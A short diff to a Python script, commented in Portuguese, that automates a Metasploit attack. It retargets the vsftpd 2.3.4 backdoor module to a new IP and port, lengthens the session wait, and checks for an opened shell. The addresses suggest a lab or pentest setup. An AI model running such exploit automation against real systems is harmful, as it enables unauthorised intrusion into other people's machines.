@@ -8,7 +8,7 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from metasploit_client import MetasploitClient
 
-TARGET_IP = "192.168.70.30"
+TARGET_IP = "10.19.3.141"
 ATTACKER_IP = "192.168.70.20"
 
 def test_exploit(client, name, options):
@@ -31,8 +31,8 @@ def test_exploit(client, name, options):
         client.run_module("exploit", name, options)
         
         # Espera um pouco pela sessao
-        print("    [2] Aguardando sessao (10s)...")
-        time.sleep(10)
+        print("    [2] Aguardando sessao (20s)...")
+        time.sleep(20)
         
         # Verifica
         sid = client.check_session()
@@ -62,7 +62,7 @@ def main():
     success_ftp = test_exploit(
         client, 
         "unix/ftp/vsftpd_234_backdoor", 
-        {"RPORT": 21}
+        {"RPORT": 20021}
     )
 
     if success_ftp:
